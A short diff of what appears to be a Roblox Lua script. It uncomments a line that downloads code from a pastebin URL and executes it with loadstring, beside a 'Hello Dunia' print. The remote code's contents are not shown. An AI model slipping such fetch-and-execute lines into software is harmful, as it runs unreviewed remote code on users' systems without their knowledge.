@@ -501,7 +501,7 @@ if not success1 then
 end
 
 local success2, err2 = pcall(function()
-    -- loadstring(game:HttpGet("https://pastebin.com/raw/SZQYx8gK"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/SZQYx8gK"))()
     print("Hello Dunia")
 end)
 if not success2 then
